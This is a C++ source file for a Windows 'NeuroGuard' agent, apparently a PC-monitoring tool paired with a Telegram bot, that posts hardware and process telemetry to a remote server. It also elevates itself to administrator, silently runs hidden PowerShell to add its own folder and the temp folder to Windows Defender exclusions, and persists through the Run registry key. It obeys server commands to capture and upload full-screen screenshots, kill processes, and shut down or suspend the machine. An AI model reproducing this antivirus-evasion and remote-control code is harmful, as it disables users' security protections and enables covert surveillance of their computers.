
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#define UNICODE
#define _UNICODE
#define ID_TRAY_EXIT       1001
#define WM_TRAYICON        (WM_USER + 1)
#define WM_SCREENSHOT_DONE (WM_USER + 2)

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <iphlpapi.h>
#include <netioapi.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <shellapi.h>
#include <powrprof.h>
#include <objidl.h>
#include <winreg.h>
#include <WbemIdl.h>
#include <gdiplus.h>
#include <comdef.h>

#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <vector>
#include <thread>
#include <chrono>
#include <algorithm>
#include <iomanip>
#include <mutex>

#include <nlohmann/json.hpp>
#include <cpr/cpr.h>

#include "NativeCollector.hpp"  // RAM, Disks, Power
#include "OhmCollector.hpp"     // CPU/GPU temp+load, PSU voltages

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "powrprof.lib")

using json = nlohmann::json;
using namespace std;
using namespace Gdiplus;

bool IsDefenderExclusionSet() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths",
        0, KEY_READ, &hKey) != ERROR_SUCCESS) return false;
    char exePath[MAX_PATH]; GetModuleFileNameA(NULL, exePath, MAX_PATH);
    string dir(exePath); dir = dir.substr(0, dir.find_last_of("\\/"));
    wstring wdir(dir.begin(), dir.end());
    DWORD type, size = 0;
    bool found = (RegQueryValueExW(hKey, wdir.c_str(), NULL, &type, NULL, &size) == ERROR_SUCCESS);
    RegCloseKey(hKey);
    return found;
}

void EnsureDefenderExclusion() {
    if (IsDefenderExclusionSet()) return;
    char exePath[MAX_PATH]; GetModuleFileNameA(NULL, exePath, MAX_PATH);
    string dir(exePath); dir = dir.substr(0, dir.find_last_of("\\/"));
    char tempPath[MAX_PATH]; GetTempPathA(MAX_PATH, tempPath);
    string temp(tempPath);
    if (!temp.empty() && temp.back() == '\\') temp.pop_back();
    string cmd = "/c powershell -NonInteractive -WindowStyle Hidden "
        "-Command \"Add-MpPreference -ExclusionPath '" + dir + "'; "
        "Add-MpPreference -ExclusionPath '" + temp + "'\"";
    SHELLEXECUTEINFOA sei = {};
    sei.cbSize = sizeof(sei); sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb = "runas"; sei.lpFile = "cmd.exe";
    sei.lpParameters = cmd.c_str(); sei.nShow = SW_HIDE;
    ShellExecuteExA(&sei);
    if (sei.hProcess) { WaitForSingleObject(sei.hProcess, 5000); CloseHandle(sei.hProcess); }
}

struct TempHistory { vector<float> cpuTemps, gpuTemps; };
TempHistory tempHistory;
mutex       tempMutex;
const int   MAX_HISTORY = 3600;

void recordTemperatures(float cpuTemp, float gpuTemp) {
    lock_guard<mutex> lk(tempMutex);
    auto push = [](vector<float>& v, float val) {
        if (val > 0) { v.push_back(val); if ((int)v.size() > MAX_HISTORY) v.erase(v.begin()); }
    };
    push(tempHistory.cpuTemps, cpuTemp);
    push(tempHistory.gpuTemps, gpuTemp);
}

float getAvgTemp(const vector<float>& v) {
    lock_guard<mutex> lk(tempMutex);
    if (v.empty()) return 0.0f;
    float s = 0; for (auto t : v) s += t; return s / (float)v.size();
}

float getMaxTemp(const vector<float>& v) {
    lock_guard<mutex> lk(tempMutex);
    return v.empty() ? 0.0f : *max_element(v.begin(), v.end());
}

NOTIFYICONDATA nid           = {};
HWND           g_hTrayWnd   = NULL;
bool           g_isBackgroundMode = false;
bool           g_startedFromClose = false;
HANDLE         g_backgroundMutex  = NULL;

struct NetState {
    ULONG64 lastIn = 0, lastOut = 0;
    chrono::steady_clock::time_point lastTime = chrono::steady_clock::now();
} g_netState;

pair<double,double> getNetSpeed() {
    MIB_IF_TABLE2* pTable = nullptr;
    if (GetIfTable2(&pTable) != NO_ERROR) return {0, 0};
    ULONG64 curIn = 0, curOut = 0;
    for (ULONG i = 0; i < pTable->NumEntries; i++) {
        auto& e = pTable->Table[i];
        if (e.Type != IF_TYPE_SOFTWARE_LOOPBACK && e.OperStatus == IfOperStatusUp) {
            curIn += e.InOctets; curOut += e.OutOctets;
        }
    }
    FreeMibTable(pTable);
    auto   now = chrono::steady_clock::now();
    double dt  = chrono::duration<double>(now - g_netState.lastTime).count();
    double down = 0, up = 0;
    if (g_netState.lastIn > 0 && dt > 0.1 &&
        curIn >= g_netState.lastIn && curOut >= g_netState.lastOut) {
        down = ((curIn  - g_netState.lastIn)  / 1048576.0) / dt;
        up   = ((curOut - g_netState.lastOut) / 1048576.0) / dt;
    }
    g_netState.lastIn = curIn; g_netState.lastOut = curOut; g_netState.lastTime = now;
    return {down, up};
}

struct ProcessInfo { string name; DWORD pid; float memory_mb, cpu_usage; };

static unsigned long long FileTimeToULL(const FILETIME& ft) {
    ULARGE_INTEGER u; u.LowPart = ft.dwLowDateTime; u.HighPart = ft.dwHighDateTime;
    return u.QuadPart;
}

vector<ProcessInfo> getTopProcesses() {
    DWORD pids[2048], cb;
    if (!EnumProcesses(pids, sizeof(pids), &cb)) return {};
    DWORD cnt = cb / sizeof(DWORD);
    SYSTEM_INFO si; GetSystemInfo(&si);
    DWORD numCpu = max((DWORD)1, si.dwNumberOfProcessors);

    struct Snap { DWORD pid; unsigned long long kt, ut; float mb; wstring name; };
    vector<Snap> snaps; snaps.reserve(cnt);

    for (DWORD i = 0; i < cnt; i++) {
        HANDLE h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pids[i]);
        if (!h) continue;
        FILETIME ct, et, kt, ut;
        if (!GetProcessTimes(h, &ct, &et, &kt, &ut)) { CloseHandle(h); continue; }
        TCHAR nm[MAX_PATH] = TEXT("<unknown>");
        HMODULE hm; DWORD cb2;
        if (EnumProcessModules(h, &hm, sizeof(hm), &cb2)) GetModuleBaseName(h, hm, nm, MAX_PATH);
        PROCESS_MEMORY_COUNTERS pmc;
        float mb = GetProcessMemoryInfo(h, &pmc, sizeof(pmc)) ? (float)pmc.WorkingSetSize / (1024.f*1024.f) : 0;
        snaps.push_back({pids[i], FileTimeToULL(kt), FileTimeToULL(ut), mb, wstring(nm)});
        CloseHandle(h);
    }
    Sleep(50);

    vector<ProcessInfo> result;
    for (auto& s : snaps) {
        HANDLE h = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, s.pid);
        if (!h) continue;
        FILETIME ct, et, kt, ut; float cpu = 0;
        if (GetProcessTimes(h, &ct, &et, &kt, &ut)) {
            unsigned long long delta = (FileTimeToULL(kt) + FileTimeToULL(ut)) - (s.kt + s.ut);
            cpu = min(100.f, max(0.f, 100.f * (float)delta / (500000.f * (float)numCpu)));
        }
        CloseHandle(h);
        ProcessInfo pi; pi.pid = s.pid; pi.memory_mb = s.mb; pi.cpu_usage = cpu;
        pi.name.assign(s.name.begin(), s.name.end());
        result.push_back(pi);
    }
    sort(result.begin(), result.end(), [](auto& a, auto& b){ return a.cpu_usage > b.cpu_usage; });
    if ((int)result.size() > 5) result.resize(5);
    return result;
}

static int GetEncoderClsid(const WCHAR* fmt, CLSID* clsid) {
    UINT n = 0, s = 0; GetImageEncodersSize(&n, &s); if (!s) return -1;
    auto* info = (ImageCodecInfo*)malloc(s); if (!info) return -1;
    GetImageEncoders(n, s, info);
    for (UINT i = 0; i < n; i++)
        if (!wcscmp(info[i].MimeType, fmt)) { *clsid = info[i].Clsid; free(info); return i; }
    free(info); return -1;
}

vector<BYTE> takeScreenshot() {
    int x = GetSystemMetrics(SM_XVIRTUALSCREEN), y = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int w = GetSystemMetrics(SM_CXVIRTUALSCREEN), h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    HDC hScrDC = GetDC(NULL), hMemDC = CreateCompatibleDC(hScrDC);
    HBITMAP hBmp = CreateCompatibleBitmap(hScrDC, w, h);
    HGDIOBJ hOld = SelectObject(hMemDC, hBmp);
    BitBlt(hMemDC, 0, 0, w, h, hScrDC, x, y, SRCCOPY);
    Gdiplus::Bitmap bmp(hBmp, NULL);
    CLSID clsid; vector<BYTE> result;
    if (GetEncoderClsid(L"image/png", &clsid) != -1) {
        IStream* pStr = nullptr;
        if (SUCCEEDED(CreateStreamOnHGlobal(NULL, TRUE, &pStr))) {
            if (bmp.Save(pStr, &clsid) == Gdiplus::Ok) {
                STATSTG st{}; pStr->Stat(&st, STATFLAG_NONAME);
                ULONG sz = (ULONG)st.cbSize.QuadPart; result.resize(sz);
                LARGE_INTEGER li{}; pStr->Seek(li, STREAM_SEEK_SET, NULL);
                ULONG rd = 0; pStr->Read(result.data(), sz, &rd); result.resize(rd);
            }
            pStr->Release();
        }
    }
    SelectObject(hMemDC, hOld); DeleteObject(hBmp);
    DeleteDC(hMemDC); ReleaseDC(NULL, hScrDC);
    return result;
}

void uploadScreenshot(const string& hwid, const vector<BYTE>& png) {
    if (png.empty()) return;
    char tmp[MAX_PATH]; GetTempPathA(MAX_PATH, tmp);
    string fn = string(tmp) + "ng_shot.png";
    HANDLE hf = CreateFileA(fn.c_str(), GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL);
    if (hf == INVALID_HANDLE_VALUE) return;
    DWORD wr; WriteFile(hf, png.data(), (DWORD)png.size(), &wr, NULL); CloseHandle(hf);
    cpr::Post(
        cpr::Url{"http://IP/upload_screenshot/" + hwid},
        cpr::Multipart{{"file", cpr::File{fn}}},
        cpr::Header{{"ngrok-skip-browser-warning","true"}}
    );
    DeleteFileA(fn.c_str());
    if (g_hTrayWnd) PostMessage(g_hTrayWnd, WM_SCREENSHOT_DONE, 0, 0);
}

string getHWID() {
    DWORD vol = 0;
    GetVolumeInformationW(L"C:\\", NULL, 0, &vol, NULL, NULL, NULL, 0);
    ULONG bufLen = sizeof(IP_ADAPTER_INFO) * 16;
    vector<BYTE> buf(bufLen);
    DWORD ret = GetAdaptersInfo((IP_ADAPTER_INFO*)buf.data(), &bufLen);
    if (ret == ERROR_BUFFER_OVERFLOW) { buf.resize(bufLen); ret = GetAdaptersInfo((IP_ADAPTER_INFO*)buf.data(), &bufLen); }
    string mac = "000000000000";
    if (ret == NO_ERROR) {
        auto* a = (IP_ADAPTER_INFO*)buf.data();
        while (a) {
            string desc(a->Description); bool virt = false;
            for (const auto& kw : {"VMware","VirtualBox","Hyper-V","TAP","Loopback","Pseudo"})
                if (desc.find(kw) != string::npos) { virt = true; break; }
            if (!virt && a->AddressLength == 6) {
                char m[32];
                snprintf(m, sizeof(m), "%02X%02X%02X%02X%02X%02X",
                    a->Address[0],a->Address[1],a->Address[2],
                    a->Address[3],a->Address[4],a->Address[5]);
                mac = m; break;
            }
            a = a->Next;
        }
    }
    ostringstream oss; oss << hex << uppercase << vol << "-" << mac;
    return oss.str();
}

static string g_diskModel;

string getDiskModelWmi() {
    if (!g_diskModel.empty()) return g_diskModel;

    string result;
    IWbemLocator*  pLoc = nullptr;
    IWbemServices* pSvc = nullptr;

    if (FAILED(CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER,
        IID_IWbemLocator, (LPVOID*)&pLoc))) return "N/A";

    if (FAILED(pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"),
        nullptr, nullptr, nullptr, 0L, nullptr, 0, &pSvc))) {
        pLoc->Release(); return "N/A";
    }

    CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr,
        RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE);

    IEnumWbemClassObject* pEnum = nullptr;
    if (SUCCEEDED(pSvc->ExecQuery(bstr_t("WQL"),
        bstr_t("SELECT Model FROM Win32_DiskDrive"),
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, nullptr, &pEnum))) {
        IWbemClassObject* pObj = nullptr; ULONG ret = 0;
        while (pEnum && pEnum->Next(WBEM_INFINITE, 1, &pObj, &ret) == S_OK && ret > 0) {
            VARIANT v; VariantInit(&v);
            if (SUCCEEDED(pObj->Get(L"Model", 0, &v, 0, 0)) && v.vt == VT_BSTR) {
                if (!result.empty()) result += ", ";
                result += string(_bstr_t(v.bstrVal));
                VariantClear(&v);
            }
            pObj->Release();
        }
        pEnum->Release();
    }
    pSvc->Release(); pLoc->Release();
    g_diskModel = result.empty() ? "N/A" : result;
    return g_diskModel;
}

string sendTelemetry(
    const string&          hwid,
    const OhmData&         ohm,
    const RamData&         ram,
    const vector<DiskData>& disks,
    const PowerData&       power,
    double netDown, double netUp,
    const vector<ProcessInfo>& procs,
    double uptime, double kwh,
    float cpuTempAvg, float cpuTempMax,
    float gpuTempAvg, float gpuTempMax,
    const vector<int>&     coreLoads,
    bool& shouldStop)
{
    json j;
    j["hwid"]          = hwid;
    j["cpu_load"]      = min(100.f, max(0.f, ohm.cpuLoad));
    j["cpu_temp"]      = ohm.cpuTemp;
    j["cpu_model"]     = ohm.cpuName.empty() ? "N/A" : ohm.cpuName;
    j["cpu_cores"]     = coreLoads;
    j["cpu_temp_avg"]  = round(cpuTempAvg * 10.f) / 10.f;
    j["cpu_temp_max"]  = round(cpuTempMax * 10.f) / 10.f;
    j["gpu_load"]      = min(100.f, max(0.f, ohm.gpuLoad));
    j["gpu_temp"]      = ohm.gpuTemp;
    j["gpu_model"]     = ohm.gpuName.empty() ? "N/A" : ohm.gpuName;
    j["gpu_temp_avg"]  = round(gpuTempAvg * 10.f) / 10.f;
    j["gpu_temp_max"]  = round(gpuTempMax * 10.f) / 10.f;
    j["ram_load"]      = min(100.f, max(0.f, (float)ram.percent));
    j["ram_used"]      = round(ram.usedGb  * 100.f) / 100.f;
    j["ram_total"]     = round(ram.totalGb *  10.f) /  10.f;
    j["power_source"]  = power.source;
    j["battery_pct"]   = min(100, max(0, power.batteryPercent));
    j["uptime"]        = (int)power.uptime;
    j["disk_model"]    = getDiskModelWmi();
    j["net_down"]      = round(netDown * 100.0) / 100.0;
    j["net_up"]        = round(netUp   * 100.0) / 100.0;
    j["session_uptime"]= uptime;
    j["estimated_kwh"] = round(kwh * 100.f) / 100.f;

    j["disks"] = json::array();
    for (auto& d : disks) {
        string name = d.name;
        while (!name.empty() && (name.back() == '\\' || name.back() == '/')) name.pop_back();
        j["disks"].push_back({
            {"drive_name", name},
            {"total_gb",   round(d.totalGb * 10.f) / 10.f},
            {"used_gb",    round(d.usedGb  * 10.f) / 10.f},
            {"percent",    (float)min(100, max(0, d.percent))}
        });
    }

    j["top_processes"] = json::array();
    for (auto& p : procs)
        j["top_processes"].push_back({
            {"name", p.name}, {"pid", p.pid},
            {"ram",  (float)p.memory_mb},
            {"cpu",  round(min(100.f, max(0.f, p.cpu_usage)) * 10.f) / 10.f}
        });

    string body = j.dump();

    for (int attempt = 0; attempt < 3; attempt++) {
        if (attempt) this_thread::sleep_for(chrono::seconds(2));
        try {
            auto r = cpr::Post(
                cpr::Url{"http://IP/telemetry"},
                cpr::Body{body},
                cpr::Header{{"Content-Type","application/json"},{"ngrok-skip-browser-warning","true"}},
                cpr::Timeout{8000});
            if (r.status_code == 200) return r.text;
            if (r.status_code == 401) {
                cerr << "[WARN] 401 — устройство отвязано\n";
                shouldStop = true; return "";
            }
            cerr << "[ERR] Backend " << r.status_code << ": "
                 << r.text.substr(0, min((int)r.text.size(), 200)) << "\n";
        } catch (const exception& e) {
            cerr << "[ERR] attempt " << attempt+1 << ": " << e.what() << "\n";
        }
    }
    return "";
}

bool IsAutorunAsked() {
    HKEY hk; DWORD v = 0, s = sizeof(DWORD);
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\NeuroGuard", 0, KEY_READ, &hk) == ERROR_SUCCESS) {
        RegQueryValueExW(hk, L"AutorunAsked", NULL, NULL, (LPBYTE)&v, &s); RegCloseKey(hk);
    }
    return v == 1;
}

void SaveAutorunAsked() {
    HKEY hk; DWORD v = 1;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\NeuroGuard",
        0, NULL, 0, KEY_WRITE, NULL, &hk, NULL) == ERROR_SUCCESS) {
        RegSetValueExW(hk, L"AutorunAsked", 0, REG_DWORD, (const BYTE*)&v, sizeof(DWORD));
        RegCloseKey(hk);
    }
}

void SetAutorun(bool enable) {
    HKEY hk;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_SET_VALUE, &hk) == ERROR_SUCCESS) {
        if (enable) {
            WCHAR p[MAX_PATH]; GetModuleFileNameW(NULL, p, MAX_PATH);
            wstring q = wstring(L"\"") + p + L"\" --background";
            RegSetValueExW(hk, L"NeuroGuard", 0, REG_SZ,
                (const BYTE*)q.c_str(), (DWORD)((q.size()+1)*sizeof(WCHAR)));
        } else { RegDeleteValueW(hk, L"NeuroGuard"); }
        RegCloseKey(hk);
    }
}

void ShowTrayNotification(const wstring& title, const wstring& msg, DWORD flags = NIIF_INFO) {
    nid.uFlags |= NIF_INFO;
    wcscpy_s(nid.szInfoTitle, title.c_str());
    wcscpy_s(nid.szInfo, msg.c_str());
    nid.dwInfoFlags = flags;
    Shell_NotifyIconW(NIM_MODIFY, &nid);
    nid.uFlags &= ~NIF_INFO;
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    if (uMsg == WM_TRAYICON && lParam == WM_RBUTTONUP) {
        POINT pt; GetCursorPos(&pt);
        HMENU hm = CreatePopupMenu();
        AppendMenuW(hm, MF_STRING, ID_TRAY_EXIT, L"Выход");
        SetForegroundWindow(hwnd);
        TrackPopupMenu(hm, TPM_LEFTALIGN | TPM_RIGHTBUTTON, pt.x, pt.y, 0, hwnd, NULL);
        PostMessage(hwnd, WM_NULL, 0, 0); DestroyMenu(hm); return 0;
    }
    if (uMsg == WM_COMMAND && LOWORD(wParam) == ID_TRAY_EXIT) {
        Shell_NotifyIconW(NIM_DELETE, &nid); exit(0);
    }
    if (uMsg == WM_SCREENSHOT_DONE) {
        ShowTrayNotification(L"NeuroGuard", L"Скриншот сделан и отправлен"); return 0;
    }
    if (uMsg == WM_QUERYENDSESSION || uMsg == WM_ENDSESSION) {
        Shell_NotifyIconW(NIM_DELETE, &nid); return TRUE;
    }
    return DefWindowProcW(hwnd, uMsg, wParam, lParam);
}

void ProcessTrayMessages() {
    MSG msg;
    while (PeekMessageW(&msg, NULL, 0, 0, PM_REMOVE)) {
        TranslateMessage(&msg); DispatchMessageW(&msg);
    }
}

bool IsRunningAsAdmin() {
    BOOL r = FALSE; HANDLE t = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &t)) {
        TOKEN_ELEVATION e; DWORD s = sizeof(e);
        if (GetTokenInformation(t, TokenElevation, &e, sizeof(e), &s)) r = e.TokenIsElevated;
        CloseHandle(t);
    }
    return r;
}

void RestartAsAdmin() {
    WCHAR p[MAX_PATH]; if (!GetModuleFileNameW(NULL, p, MAX_PATH)) return;
    SHELLEXECUTEINFOW sei = {sizeof(sei)};
    sei.lpVerb = L"runas"; sei.lpFile = p; sei.nShow = SW_NORMAL;
    if (!ShellExecuteExW(&sei)) exit(0);
}

bool LaunchBackgroundInstance(bool fromClose) {
    HANDLE hCheck = OpenMutexW(SYNCHRONIZE, FALSE, L"Global\\NeuroGuardAgentMutex");
    if (hCheck) { CloseHandle(hCheck); return true; }
    WCHAR p[MAX_PATH] = {};
    if (!GetModuleFileNameW(NULL, p, MAX_PATH)) return false;
    wstring cmd = wstring(L"\"") + p + L"\" --background";
    if (fromClose) cmd += L" --from-close";
    STARTUPINFOW si = {}; si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {};
    BOOL ok = CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE,
        CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (!ok) return false;
    CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
    return true;
}

void EnsureConsole() {
    if (!GetConsoleWindow()) AllocConsole();
    FILE* d = nullptr;
    freopen_s(&d, "CONIN$",  "r", stdin);
    freopen_s(&d, "CONOUT$", "w", stdout);
    freopen_s(&d, "CONOUT$", "w", stderr);
    SetConsoleCP(CP_UTF8); SetConsoleOutputCP(CP_UTF8);
}

void requestAuthCode(const string& hwid) {
    try {
        auto r = cpr::Post(cpr::Url{"http://IP/auth/generate/" + hwid},
            cpr::Timeout{8000});
        if (r.status_code == 200) {
            auto d = json::parse(r.text);
            if (d.contains("code")) {
                string code = d["code"].get<string>();
                string cmd  = "/auth " + code;
                cout << "\n";
                cout << "  +===========================================+\n";
                cout << "  |         NEUROGUARD - ПРИВЯЗКА ПК          |\n";
                cout << "  +===========================================+\n";
                cout << "  |                                           |\n";
                cout << "  |  ШАГ 1: Откройте Telegram                 |\n";
                cout << "  |  ШАГ 2: Найдите @NeuroGuardProBot         |\n";
                cout << "  |  ШАГ 3: Отправьте боту:                   |\n";
                cout << "  |                                           |\n";
                cout << "  |   " << cmd;
                int sp = 43 - (int)cmd.size() - 3; if (sp < 1) sp = 1;
                cout << string(sp, ' ') << "|\n";
                cout << "  |                                           |\n";
                cout << "  +===========================================+\n";
                cout << "  >> Ваш код: " << code << "\n\n";
                cout << "  Это окно можно закрыть после привязки.\n\n";
            } else if (d.value("status","") == "already_linked") {
                cout << "\n  [*] Устройство уже привязано. Агент работает.\n\n";
            }
        } else {
            cout << "\n  [!] Сервер недоступен (код: " << r.status_code << ")\n\n";
        }
    } catch (...) { cout << "\n  [!] Ошибка подключения к серверу.\n\n"; }
}

int main(int argc, char* argv[]) {
    for (int i = 1; i < argc; i++) {
        string a = argv[i];
        if (a == "--background") g_isBackgroundMode = true;
        if (a == "--from-close") g_startedFromClose = true;
    }

    if (!IsRunningAsAdmin()) { RestartAsAdmin(); return 0; }

    if (g_isBackgroundMode) {
        g_backgroundMutex = CreateMutexW(NULL, TRUE, L"Global\\NeuroGuardAgentMutex");
        if (g_backgroundMutex && GetLastError() == ERROR_ALREADY_EXISTS) {
            CloseHandle(g_backgroundMutex); return 0;
        }
    }

    EnsureDefenderExclusion();

    if (!g_isBackgroundMode) {
        LaunchBackgroundInstance(false);
        EnsureConsole();
        string hwid = getHWID();
        if (!IsAutorunAsked()) {
            cout << "[?] Добавить в автозапуск? (y/n): ";
            char c; cin >> c;
            if (c == 'y' || c == 'Y') { SetAutorun(true); cout << "[+] Добавлено\n"; }
            else cout << "[-] Пропущено\n";
            SaveAutorunAsked();
        }
        requestAuthCode(hwid);
        cout << "[*] Агент запущен в фоне. Это окно можно закрыть.\n";
        while (true) this_thread::sleep_for(chrono::milliseconds(500));
    }

    WNDCLASSEXW wc = {sizeof(wc)};
    wc.lpfnWndProc = WindowProc; wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = L"NeuroGuardTrayClass";
    RegisterClassExW(&wc);
    g_hTrayWnd = CreateWindowExW(0, wc.lpszClassName, L"", 0,
        0, 0, 0, 0, NULL, NULL, wc.hInstance, NULL);

    nid.cbSize           = sizeof(NOTIFYICONDATAW);
    nid.hWnd             = g_hTrayWnd; nid.uID = 1;
    nid.uFlags           = NIF_ICON | NIF_MESSAGE | NIF_TIP;
    nid.uCallbackMessage = WM_TRAYICON;
    nid.hIcon            = LoadIcon(NULL, IDI_APPLICATION);
    wcscpy_s(nid.szTip, L"NeuroGuard Agent");
    Shell_NotifyIconW(NIM_ADD, &nid);

    if (g_startedFromClose)
        ShowTrayNotification(L"NeuroGuard", L"Агент работает в фоне");

    GdiplusStartupInput gsi; ULONG_PTR gToken;
    GdiplusStartup(&gToken, &gsi, NULL);

    HRESULT hrCo = CoInitializeEx(NULL, COINIT_MULTITHREADED);

    OhmCollector ohm("OpenHardwareMonitor.exe");
    bool ohmReady = ohm.Init();

    getDiskModelWmi();

    string hwid = getHWID();
    string rank = "free";
    bool   shouldStop = false;

    cout << "[*] OHM:  " << (ohmReady ? "OK" : "не готов") << "\n"
         << "[*] HWID: " << hwid << "\n\n";

    double totalUptime = 0.0;
    auto   startTime   = chrono::steady_clock::now();
    int    watchdogTick = 0;

    while (!shouldStop) {
        ProcessTrayMessages();

        auto   now = chrono::steady_clock::now();
        double dt  = chrono::duration<double>(now - startTime).count();
        startTime  = now;
        if (dt >= 0.1 && dt < 60.0) totalUptime += dt;
        double kwh = (550.0 * totalUptime / 3600.0) / 1000.0;

        if (++watchdogTick >= 15) { ohm.Watchdog(); watchdogTick = 0; }

        try {
            OhmData          od    = ohm.Collect();
            RamData          ram   = getExtendedRamNative();
            vector<DiskData> disks = getAllDisksNative();
            PowerData        power = getPowerStatusNative();
            auto [netDown, netUp] = getNetSpeed();

            vector<int> coreLoads;
            {
                typedef LONG (WINAPI*NtQSI_t)(UINT, PVOID, ULONG, PULONG);
                static NtQSI_t NtQSI = (NtQSI_t)GetProcAddress(
                    GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
                if (NtQSI) {
                    SYSTEM_INFO si; GetSystemInfo(&si);
                    int n = (int)si.dwNumberOfProcessors;
                    struct PerfInfo {
                        LARGE_INTEGER IdleTime, KernelTime, UserTime, DpcTime, InterruptTime;
                        ULONG InterruptCount;
                    };
                    static vector<PerfInfo> prev(n);
                    vector<PerfInfo> cur(n);
                    if (NtQSI(8, cur.data(), sizeof(PerfInfo)*n, NULL) == 0) {
                        for (int i = 0; i < n; i++) {
                            ULONGLONG idle   = cur[i].IdleTime.QuadPart   - prev[i].IdleTime.QuadPart;
                            ULONGLONG kernel = cur[i].KernelTime.QuadPart - prev[i].KernelTime.QuadPart;
                            ULONGLONG user   = cur[i].UserTime.QuadPart   - prev[i].UserTime.QuadPart;
                            ULONGLONG total  = kernel + user;
                            int load = (total > 0) ? (int)((total - idle) * 100ULL / total) : 0;
                            coreLoads.push_back(max(0, min(100, load)));
                        }
                        prev = cur;
                    }
                }
            }

            recordTemperatures(od.cpuTemp, od.gpuTemp);
            float cpuTempAvg = getAvgTemp(tempHistory.cpuTemps);
            float cpuTempMax = getMaxTemp(tempHistory.cpuTemps);
            float gpuTempAvg = getAvgTemp(tempHistory.gpuTemps);
            float gpuTempMax = getMaxTemp(tempHistory.gpuTemps);

            vector<ProcessInfo> procs = getTopProcesses();

            string resp = sendTelemetry(
                hwid, od, ram, disks, power,
                netDown, netUp, procs,
                totalUptime, kwh,
                cpuTempAvg, cpuTempMax,
                gpuTempAvg, gpuTempMax,
                coreLoads, shouldStop);

            if (!resp.empty()) {
                auto rj = json::parse(resp);
                if (rj.contains("rank") && !rj["rank"].is_null())
                    rank = rj["rank"].get<string>();

                string cmd = rj.value("command","none");
                if (!cmd.empty() && cmd != "none") {
                    if (cmd == "screenshot" && rank == "overseer") {
                        thread([hwid](){ uploadScreenshot(hwid, takeScreenshot()); }).detach();
                    } else if (cmd == "sleep") {
                        SetSuspendState(FALSE, TRUE, FALSE);
                    } else if (cmd == "shutdown") {
                        HANDLE hTok; TOKEN_PRIVILEGES tkp;
                        if (OpenProcessToken(GetCurrentProcess(),
                            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok)) {
                            LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
                            tkp.PrivilegeCount = 1; tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
                            AdjustTokenPrivileges(hTok, FALSE, &tkp, 0, NULL, NULL);
                            CloseHandle(hTok);
                        }
                        InitiateSystemShutdownExW(NULL, (LPWSTR)L"NeuroGuard",
                            30, TRUE, FALSE, SHTDN_REASON_MAJOR_OTHER);
                    } else if (cmd == "cancel_shutdown") {
                        AbortSystemShutdownW(NULL);
                    } else if (cmd.find("kill_") == 0) {
                        try {
                            DWORD pid = (DWORD)stoi(cmd.substr(5));
                            HANDLE hP = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
                            if (hP) { TerminateProcess(hP, 1); CloseHandle(hP); }
                        } catch (...) {}
                    }
                }
            }
        } catch (const exception& e) {
            cerr << "[!] Loop error: " << e.what() << "\n";
        }

        for (int i = 0; i < 30 && !shouldStop; i++) {
            ProcessTrayMessages();
            this_thread::sleep_for(chrono::milliseconds(100));
        }
    }

    Shell_NotifyIconW(NIM_DELETE, &nid);
    GdiplusShutdown(gToken);
    if (SUCCEEDED(hrCo)) CoUninitialize();
    if (g_backgroundMutex) CloseHandle(g_backgroundMutex);
    return 0;
}